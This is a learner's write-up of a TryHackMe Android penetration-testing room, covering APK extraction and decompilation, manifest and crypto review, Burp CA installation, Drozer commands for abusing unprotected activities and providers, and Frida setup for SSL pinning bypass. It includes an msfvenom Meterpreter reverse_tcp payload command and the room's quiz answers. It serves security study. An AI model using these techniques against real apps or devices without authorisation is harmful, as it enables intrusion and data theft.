<h1 align="center">Android Hacking 101</h1>
<p align="center">2025, August 19<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>469</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Android Mobile Application Penetration Testing</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/d4b70e24-b3e5-45eb-9209-6917d009c79c"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/androidhacking101">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/9a4745a8-6511-42c7-a60b-19609e62cf7d"></p>

<br>
<h2>Task 1 .  Introduction</h2>
<br>

<p><em>Answer the question below</em></p>

<p>1.1. Read the above!<br>
<code>No answer needed</code></p>

<br>
<br>
<h2>Task 2 . Setup environment</h2>
<br>

<p><em>Answer the question below</em></p>

<p>2.1. Read the above!<br>
<code>No answer needed</code></p>

<br>

<img width="1035" height="277" alt="image" src="https://github.com/user-attachments/assets/ab05d692-d5d1-4f30-abdb-4399cec451e6" />

<br>
<br>

<img width="974" height="351" alt="image" src="https://github.com/user-attachments/assets/ef8cc380-88bb-4208-be3b-58577a25c65f" />



<br>
<br>
<h2>Task 3 . Methodology</h2>
<p>

- Information Gathering<br>
- Reversing<br>
- Static Analysis<br>
- Dinamyc Analysis<br>
- Report</p>


<p><em>Answer the question below</em></p>

<p><code>No answer needed</code></p>


<br>
<br>
<h2>Task 4 . Information Gathering</h2>
<p>Information collection is the first thing we need to do, as this information will guide us to the next stage in our penetration tests.<br>

<code>Black Box</code>: In penetration testing, black-box testing refers to a method where an ethical hacker has no knowledge of the system being attacked.<br>

How do I find the application of the organization?<br>

Easy, <code>play store</code>: is a digital distribution platform for mobile apps for devices with Android operating system.<br><br>

<code>White Box</code>: White box penetration testing can also be called glass box penetration testing or clear box penetration testing. In any case, it's an approach to penetration testing that relies on the knowledge of the target system's internal configuration. It uses this information for the test cases.<br>

In a real scenario the client it will give us the mobile app, users and passwords to perform the login and also a user manual of how the application works.</p>

<h3>Important</h3>
<p>Not use an online services for download the apk file, don't knows if we're analyzing the real app.</p>

<p><em>Answer the question below</em></p>

<p>4.1. What is the package name of the Black Hat Europe?<br>
<code>com.swapcard.apps.android.blackhat</code></p>
<br>

<img width="942" height="283" alt="image" src="https://github.com/user-attachments/assets/5381f425-ac96-425e-b318-5e2fd84eba30" />

<br>
<br>
<h2>Task 5 . Reversing</h2>
<p>In this part we will extract the legitimate apk from emulator or the device and get the source code.</p>

<h3>TOOL</h3>
<p><code>Android Debug Bridge</code> (ADB) is a development tool that facilitates communication between an Android device and a personal computer.</p>

<h4>How to view devices?</h4>

```bash
adb devices
```

<h4>How to extract apk?</h4>
<p>For this you need have installed the application in your device and know package name<./p>

```bash
adb shell pm path package_name
```

<p>This command print the path to the APK of the given.</p>

```bash
adb pull <remote> [<locaDestination>]
```

<h3>Now,how a get source code?</h3>
<p><code>jadx</code>: The jadx suite allows you to simply load an APK and look at its Java source code. What’s happening under the hood is that jADX is decompiling the APK to smali and then converting the smali back to Java.<br>

Usage:</p>

```bash
jadx -d [path-output-folder] [path-apk-or-dex-file]
```
<p>This command pulls the file remote to local. If local isn’t specified, it will pull to the current folder.</p>

<br>
<br>

<p><code>Dex2Jar</code>:  use dex2jar to convert an APK to a JAR file.</p>

```bash
d2j-dex2jar.sh or .bat /path/application.apk
```

<p>Once you have the JAR file, simply open it with JD-GUI and you’ll see its Java code.</p>

<br>
<br>

<p><code>apktool</code>:  This tool get a source code in smali.</p>

```bash
apktool d file.apk
```

<br>
<br>

<p><code>jadx-gui</code>:   UI version of jadx.</p>

```bash
jadx\bin\jadx-gui
```

<br>

<p><em>Answer the questions below</em></p>

<p>5.1. Tool for convert dex file to smali code?<br>
<code>d2j-dex2smali</code></p>

<br>

<p>5.2. Which is the option for build apps with apktool?<br>
<code>b</code></p>

<br>

<p>5.3. What is the apk path of Black Hat Europe?<br>
<code>/data/app/com.swapcard.apps.android.blackhat=/base.apk</code></p>

<br>

<p>5.4. Command for extract apk of Back Hat Europe? Note: command and path<br>
<code>adb pull /data/app/com.swapcard.apps.android.blackhat=/base.apk</code></p>


<br>
<br>
<h2>Task 6 .Static analysis</h2>

<p>Is done without running the program, what are we going to identify in this basic room?<br>

- Weak or improper cryptography use<br>
- Exported Preference Activities<br>
- Apps which enable backups<br>
- Apps which are debuggable<br>
- App Permissions<br>
- Firebase Instance(s)<br>
- Sensitive data in the code</p>

<h3>Weak or improper cryptography use:</h3>
<p> Incorrect uses of encryption algorithm may result in sensitive data exposure, key leakage, broken authentication, insecure session and spoofing attack.<br>

Example: For Java implementation, the following API is related to encryption. Review the parameters of the encryption implementation.</p>

```bash
IvParameterSpec iv = new IvParameterSpec(initVector.getBytes("UTF-8"));
```

<br>

```bash
SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes("UTF-8"), "AES");
```

<br>

<p>How to search this when I have the source code of the application? there is a super advanced tool and wonderful  called grep.</p>

```bash
grep -r "SecretKeySpec" *
```

<br>

```bash
grep -rli "aes" *
```

<br>


```bash
grep -rli "iv"
```

<br>
<br>
<p>Open the file with you favorite editor of text. Gedit/Vim/subl, etc… use this for revolse a puzzle in my ctf "LaxCTF".</p>

<p><strong>Solution</strong>: Use a cryptography asymmetric.</p>

<br>

<h3>Exported Preference Activities</h3>
<p>As we know, Android's activity component is application screen(s) and the action(s) that applied on that screen(s) when we use the application. When as activity is found to be shared with other apps on the device therefore leaving it accessible to any other application on the device.<br>

Okay, exploit this in dynamic analysis... How identify the activity is exported?<br>

With your favorite editor of text. Gedit/Vim/subl, etc… open the AndroidManifest.xml or use cat and grep.</p>

```bash
cat AndroidManifest.xml | grep "activity" --color
```

<h3>Apps which enable backups</h3>
<p>This is considered a security issue because people could backup your app via ADB and then get private data of your app into their PC.<br>

- Shared preference.<br>
- directory returned by getFilesDir().<br>
- getDataBase(path) also includes files created by SQLiteOpenHelper.<br>
- files in directories created with getDir(Sring, int).<br>
- files on external storage returned by getExternalFilesDir (String type).</p>

<p>How identify this?<br>

With your favorite editor of text. Gedit/Vim/subl, etc… open the AndroidManifest.xml or use cat and grep.</p>

<p>Real scenario? you use your mind for this exercice :3.<br>

Solution: android:allowBackup="false"<br>

Example in dynamic analysis, byee!</p>

<h3>App Permissions</h3>
<p>System permissions are divided into two groups: “normal” and “dangerous.” Normal permission groups are allowed by default, because they don’t pose a risk to your privacy. (e.g., Android allows apps to access the Internet without your permission.) Dangerous permission groups, however, can give apps access to things like your calling history, private messages, location, camera, microphone, and more. Therefore, Android will always ask you to approve dangerous permissions.<br>

In earlier versions of Android, accepting potentially dangerous permission groups was an all-or-nothing affair. You either allowed all permissions an app needed to function — before installation — or you declined them all, which meant you couldn’t install the app.<br>

I going to analyze the permissions of an apk app generated by metasploit.</p>

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 R > /root/tryhackme.apk
```

<p>Okay, HOW?<br>

With your favorite editor of text. Gedit/Vim/subl, etc… open the AndroidManifest.xml or use cat and grep.</p>

<h3>Firebase Instance(s)</h3>
<p>Last year, security researchers have discovered unprotected Firebase databases of thousands of iOS and Android mobile applications that are exposing over 100 million data records, including plain text passwords, user IDs, location, and in some cases, financial financial records such as banking and cryptocurrency transactions.<br>

Google's Firebase service is one of the most popular back-end development platforms for mobile and web applications that offers developers a cloud-based database, which stores data in JSON format and synced it in the real-time with all connected clients.<br>

How identify this?<br>

FireBase Scanner, The scripts helps security analsts to identify misconfigured firebase instances.</p>

```bash
git clone https://github.com/shivsahni/FireBaseScanner
```

<br>

```bash
python FireBaseScanner.py -p /path/apk
```

<br>
<h3>Sensitive data in the cod</h3>
<p> Users, passwords, internal IP and more ... <br>

With your favorite editor of text, Gedit/Vim/subl, etc…, grep or GUI decompiler back to reversing and experiment with your favorite tool.</p>

<p>In the real life exist very bad practice of programing! </p>

<br>
<h3>How to automatize this process?</h3>
<p>It is very entertaining to do this manually, but in a real pentest the time is not our friend.</p>

<h1 align="center"> STATIC ANALYSIS - FRAMEWORKS</h1>
<br>
<h3>MARA Framework</h3>
<p>Is a Mobile Application Reverse engineering and Analysis Framework. It is a tool that puts together commonly used mobile application reverse engineering and analysis tools, to assist in testing mobile applications against the OWASP mobile security threats. Its objective is to make this task easier and friendlier to mobile application developers and security professionals.</p>
<h4>Features:</h4>
<h5>APK Manifest Analysis</h5>

<p>

- Extract Intents<br>
- Extract exported activities<br>
- Extract receivers<br>
- Extract exported receivers<br>
- Extract Services<br>
- Extract exported services<br>
- Check if apk is debuggable<br>
- Check if apk allows backups<br>
- Check if apk allows sending of secret codes<br>
- Check if apk can receive binary SMS</p>

<h5>Security Analysis</h5>
<p>Source code static analysis based on OWASP Top Mobile Top 10 and the OWASP Mobile Apps Checklist<br>
MARA is capable of performing either single or mass analysis of apk, dex or jar files.<br>

and more....</p>


<h3>Quark</h3>
<p>Is a static code analysis tool, designed to recognize potential security vulnerabilities and points of concern for Java-based Android applications. QARK was designed to be community based, available to everyone and free for use. QARK educates developers and information security personnel about potential risks related to Android application security, providing clear descriptions of issues and links to authoritative reference sources. QARK also attempts to provide dynamically generated ADB (Android Debug Bridge) commands to aid in the validation of potential vulnerabilities it detects. It will even dynamically create a custom-built testing application, in the form of a ready to use APK, designed specifically to demonstrate the potential issues it discovers, whenever possible.</p>

<h3>MobSF</h3>
<p>My favorite tool :3 is Mobile Security Framework (MobSF) is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware analysis and security assessment framework capable of performing static and dynamic analysis.</p>

<p>

- <code>Information</code>: Display data such as app icon, app name, size, package name etc.MD5 & SHA1 are also shown. They can be useful to detect known malicious applications.<br>
- <code> Scan options</code>: Rescan the application, Start the dynamic analysis, Check the java code & the manifest file
- <br>
- <code>Signer certificate</code>: Display certificate info, Determine if an application has come from its original source.<br>
- <code>Permissions</code>: Analyzes the permissions, Determines its status concerning critically & the description of permissions.<br>
- <code>Binary analysis</code>: It is threat assessment & vulnerability testing at the binary code level. It can also be used to analyze third party libraries, allowing a richer analysis & better visibility into how applications will interact with libraries. This is analysis of binary code to identify security issues. For complex systems using third party libraries for which source code is not available binary code analysis helps to identify issues.<br>
- <code>Android API</code>: You can view android API used in app like java reflection, location.<br>
- <code>Browsable activities</code>: That can be safely invoked from a browser.<br>
- <code>Security analysis</code>:<br>Manifest analysis: Find vulnerability inside one of the components in the AndroidManifest.xml file.<br>Code analysis: Analysis result of java code by a static analyzer. Identifies potential vulnerabilities, determines their severity & the files in which this type of vulnerability was found.CVSS. Common Vulnerability Scoring System. Vulnerability is assigned a CVSS base score between 0.0 & 10.0.<br>0.0 → No risk<br>0.1–3.9 → Low risk<br>4.0–6.9 → Medium risk<br>7.0–8.9 → High risk<br>9.0–10.0 → Critical risk score<br>CWE :<br>Common Weakness Enumeration<br>· It is a list of software architecture, design or a code weakness.<br>
- <code>File analysis</code>: Shows analysis of files.<br>
- <code>Malware analysis</code>: Determine the functionality, origin & potential impact of a given malware sample such as virus.<br>
- <code>Reconnaissance</code><be>URL: Display list of URLs, IP addresses & the files in which they are stores or called. Analyzes where the android app sends the data & where it stores the info.<br>Emails<br>Strings: Analyzes the text files that are in the res directory. May contain sensitive data.<br>
- <code>Components</code>: Display a complete list of components (activity, service, content provider & receiver), imported libraries & files without defining the extension.</p>

<br>

<p><em>Answer the questions below</em></p>

<p>6.1. What is the name of the firebase instance in the app Black Hat Europe?<br>
<code>swapcard-android-app-2014</code></p>

<br>

<p>6.2. Android-InsecureBankv2 debug release, check this and what activity is not Protected.<br>
<code>com.android.insecurebankv2.ChangePassword</code></p>

<br>

<img width="975" height="408" alt="image" src="https://github.com/user-attachments/assets/85f24f00-8173-422b-8563-e8a8e5a3acbd" />

<br>
<br>

<h3>https://mobsf.live/</h3>

<img width="964" height="244" alt="image" src="https://github.com/user-attachments/assets/147aaca1-2414-413e-aa17-efe5238bed5c" />

<br>
<br>

<img width="969" height="264" alt="image" src="https://github.com/user-attachments/assets/93d7dcf5-4f1f-46b3-b7f2-8fd5bd7f31f1" />

<br>
<br>

<img width="974" height="507" alt="image" src="https://github.com/user-attachments/assets/638532a5-46e7-4773-a29b-a6d880aa397b" />

<br>
<br>

<img width="979" height="296" alt="image" src="https://github.com/user-attachments/assets/48511956-08b5-46b0-a409-dcd12cb4ccbf" />

<br>
<br>

<img width="945" height="174" alt="image" src="https://github.com/user-attachments/assets/9a9f4e2d-e381-453a-9d59-b9ab042ca005" />

<br>
<br>
<p>6.3. what is the malicious permissions in the app Android-InsecureBankv2?<br>
<code>android.permission.SEND_SMSk</code></p>

<br>

<img width="960" height="141" alt="image" src="https://github.com/user-attachments/assets/0bf9eeda-75da-4203-ad4d-5fe675ca326b" />

<br>
<br>
<h2>Task 7 . Static Analysis - Complications</h2>

<p>

- <code>Obfuscate Code</code>: is the process of modifying an executable so that it is no longer useful to a hacker but remains fully functional. While the process may modify actual method instructions or metadata, it does not alter the output of the program. To be clear, with enough time and effort, almost all code can be reverse engineered. However, on some platforms (such as Java, Android, iOS and .NET) free decompilers can easily reverse-engineer source code from an executable or library in virtually no time and with no effort. Automated code obfuscation makes reverse-engineering a program difficult and economically unfeasible. <br>
- <code>Proguard</code>: To obfuscate the code, use the Proguard utility, which makes these actions:<br>Removes unused variables, classes, methods, and attributes;<br>Eliminates unnecessary instructions;<br>Removes Tutorial information: obfuscate Androiddepuración code;<br>Renames classes, fields, and methods with unlegible names.<br>
- <code>DEXGUARD</code>:The enhanced commercial version of Proguard. This tool is capable of implementing the text encryption technique and renaming classes and methods with non-ASCII symbols.<br>
- <code>Deguard</code>: It is based on powerful probabilistic graphical models learned from thousands of open source programs. Using these models, Deguard retrieves important information in Android APK, including method and class names, as well as third-party libraries. Deguard can reveal string decoders and classes that handle sensitive data in Android malware.</p>

<h3 = align="center">Static analysis – Deobfuscation</h3>

<br>

<p><em>Answer the question below</em></p>

<p><code>No answer needed</code></p>

<br>
<br>
<h2>Task 8 . Dynamic Analysis</h2>

<p>is done running the program, <br>

How install applications with adb?</p>

```bash
adb install apkfilename.apk
```

<p>okay, now how intercept traffic of the application?<br>

<h3>Burp Suite</h3>
<code>Burp Suite</code>: Is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process, from initial mapping and analysis of an application’s attack surface, through to finding and exploiting security vulnerabilities.</p>

<h4>Configure the Burp Proxy Listener</h4>
<p>Installing trusted CA at the Android OS level (Root device/Emulator) for Android N+ as the following:</p>

```bash
openssl x509 -inform PEM -subject_hash -in BurpCA.pem | head -1
```

<br>

```bash
cat BurpCA.pem > 9a5ba580.0
```

<br>

```bash
openssl x509 -inform PEM -text -in BurpCA.pem -out /dev/null >> 9a5ba580.0
```

<br>

```bash
adb root
```

<br>

```bash
openssl x509 -inform PEM -subject_hash -in BurpCA.pem | head -1
```

<br>

```bash
abd remount
```

<br>

```bash
adb push 9a5ba580.0 /system/etc/security/cacerts/
```

<br>

```bash
adb shell "chmod 644 /system/etc/security/cacerts/9a5ba580.0"
```

<br>

```bash
adb shell "reboot"
```

<br>

<h3>PID Cat</h3>
<p>Tool for</p>

<br>

<img width="2276" height="1736" alt="image" src="https://github.com/user-attachments/assets/5087e792-8a7b-4c79-8ae6-c77b8139c16f" />

<br>
<br>
<h3>Drozer</h3>
<p><code>Drozer</code> helps to provide confidence that Android apps and devices being developed by, or deployed across, your organisation do not pose an unacceptable level of risk. By allowing you to interact with the Dalvik VM, other apps’ IPC endpoints and the underlying OS.<br>

drozer provides tools to help you use and share public exploits for Android. For remote exploits, it can generate shellcode to help you to deploy the drozer Agent as a remote administrator tool, with maximum leverage on the device.<br>

drozer is a comprehensive security audit and attack framework for Android.<br>

Basic example, Abusing unprotected activities:<br>

The requirement for this is you have install drozer in your computer and drozer agent in your emulator or devices.</p>


<p>
  
- Click in the title, for the tutorial of how install...<br>Commands:

```bash
adb forward tcp:31415 tcp:31415
```

```bash
drozer console connect
```

- Now download and install apk for this example<br>
- Retrieving package information:<br>

```bash
run app.package.list -> see all the packages installed
```

<br>

```bash
run app.package.info -a -> view package information.
```

- Identifying the attack surface -> activities unprotected and more....<br>

```bash
run app.package.attacksurface package_name
```

- view what activities can be exploited<br>

```bash
run app.activity.info -f package_name
```

- start activities unprotected<br>

```bash
run app.activity.start --component package name component_name
```

<h3>Basic Cheatsheet of Drozer</h3>

<div align="center"><h6>

|Exploiting Content Provider                                      |Exploiting Service                                                 |
| :-------------------------------------------------------------- |  :-------------------------------------------------------------- | 
| <code>run app.provider.info -a package_name<br>run scanner.provider.finduris -a package_name<br>run app.provider.query uri</code><br><code>run app.provider.update uri --selection conditions selection_arg column data</code><br><code>run scanner.provider.sqltables -a</code><br></code>package_name<br>run scanner.provider.injection -a package_name</code><br><code>run scanner.provider.traversal -a package_name</code>|<code>run app.service.info -a package_name</code><br><code>run app.service.start --action action --component package_name component_name</code><br><code>run app.service.send package_name component_name --msg what arg1 arg2 --extra type key value --bundle-as-obj</code><br><br><br><br>| 

</h6></div><br>

<h3>Inspeckage - Android Package Inspector</h3>
<p>My favorite tool, Inspeckage is a tool developed to offer dynamic analysis of Android applications. By applying hooks to functions of the Android API, Inspeckage will help you understand what an Android application is doing at runtime. Inspeckage will let you interact with some elements of the app, such as activities and providers (even unexported ones), and apply some settings on Android.<br>

Since dynamic analysis of Android applications (usually through hooks) is a core part of several mobile application security tests, the need of a tool that can help us do said tests is real. Even though there are other tools that promise to help you do that, I’ve run across some limitations when testing them:<br>

- Lack of interaction with the user doing the tests;<br>
- Only work in emulators;<br>
- Plenty of time to update the tool after an Android update;<br>
- Very poor output;<br>
- Very costly setup.</p>

<h4>Android Package Inspector Features</h4>
<p>With Inspeckage, we can get a good amount of information about the application’s behavior:

- Information gathering:<br>Requested Permissions;<br>App Permissions;<br>Shared Libraries;<br>Exported and Non-exported Activities, Content Providers,Broadcast Receivers and Services;<br>Check if the app is debuggable or not;<br>Version, UID and GIDs;<br>etc.<bbr>
- Hooks: With the hooks, we can see what the application is doing in real time:<br>Shared Preferences (log and file);<br>Serialization;<br>Crypto;<br>Hashes;<br>SQLite;<br>HTTP (an HTTP proxy tool is still the best alternative);<br>File System;<br>Miscellaneous (Clipboard, URL.Parse());<br>WebView;<br>IPC</p>

<h3>Important: Insecure Data Storage</h3>
<p> ... </p>

<p><em>Answer the question below</em></p>

<p>7.1. Read the above.<br>
<code>No answer needed</code></p>

<br>
<br>
<h2>Task 9 . Dynamic Analysis - Complications</h2>
<h3>Root Detection in Android device:</h3>
<br>
<p>...</p>


<h3>Emulator Detection:</h3>
<br>
<p>...</p>

<h3>SSL Pinning: </h3>
<br>
<p>...</p>


<p><em>Answer the question below</em></p>

<p><code>No answer needed</code></p>

<br>
<br>
<h2>Task 10 . Bypass - Complications in Dynamic Analysis</h2>
<h3>Hooking applications:</h3>
<p>Techniques used to alter the behaviour of applications

<h4>Frida</h4>
<p>In short, it is a dynamic instrumentation framework, which enables function hooking and allows to provide a definition to it during runtime. Basically, it injects JavaScript code into a process. Suppose, there is a function called “foo” in a program with a specific body/implementation. Using “Frida”, one can change the body/implementation of the “foo” function during runtime. “Frida” supports a variety of platforms like Windows, macOS, GNU/Linux, iOS, Android, and QNX. More information on “Frida” can be found here.<br>

- for install<br>

```bash
pip install frida-tools
```

- Now check version and download the server, in my case is 12.6.8<br>

```bash
frida --version
```

- unzip file and push the server in the local system /data/local/tmp<br>

```bash
adb push /path/serverfrida /data/local/tmp
```

- Permissions<br>

```bash
adb shell chmod 777 /data/local/tmp/frida-server
```

- run frida server<br>

```bash
adb shell /data/local/tmp/frida-servername&
```

- now execute in your command line <code>frida-ps -U</code><br>

- <a href="https://medium.com/@ved_wayal/hail-frida-the-universal-ssl-pinning-bypass-for-android-e9e1d733d29">Bypass SSL pinning tutorial</a></p>

<p>More hooks :v is your mision :33 </p>

<p><em>Answer the question below</em></p>

<p><code>No answer needed</code></p>

  
```bash
:~/AndroidHacking101# pip3 install frida-tools
...
:~/AndroidHacking101# frida --version
```

<br>

<img width="981" height="107" alt="image" src="https://github.com/user-attachments/assets/a6502c58-8744-4028-8455-cd86d11711a1" />

<br>
<br>
<h2>Task 11.Final</h2>

<p>This is a basic introduction to what is android hacking. Applications in CTFs are much more difficult than a real-life application.<br>

Questions?<br>

In discord: stuxnet, in twitter: _stuxnet, telelegram: stuxnet<br>

You want to know more?<br>

Check this<br>

- <a href="https://www.owasp.org/index.php/Mobile_Top_10_2016-Top_10">Owasp Mobile Top 10</a><br>
- <a href="https://www.owasp.org/index.php/OWASP_Mobile_Security_Testing_Guide">Mobile Security Testing Guide (MSTG)</a><br>
- <a href="https://twitter.com/mobilesecurity">Mobile Security Twitter</a><br><br>

See you in other occasion! good luck hacker <br>

Try Harder! </p>

<p><em>Answer the question below</em></p>

<p><code>No answer needed</code></p>


<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/ac73e28d-9710-4220-b65f-49648b458808"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/d1ae8ce0-719c-4644-9012-8c20b85a0c9d"></p>

<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">


| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 19   | 470      |    120ᵗʰ     |      5ᵗʰ     |     385ᵗʰ   |     9ᵗʰ    | 122,030  |    923    |    73     |

</div>

<p align="center">Global All Time:   120ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/bbc50483-18ee-4687-88ea-679c94626469"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/8a9eab70-0db2-41b6-97b6-7d864abbf0e9"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/1d64fe11-f76e-4fad-a862-608495bfefb5"><br>
                  Global monthly:    385ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/333ef8af-c92c-48ca-a7de-1874acafb3f3"><br>
                  Brazil monthly:      9ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/7e24cff8-f04f-4ff4-9141-eb5c07ae1dd9"><br>


<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
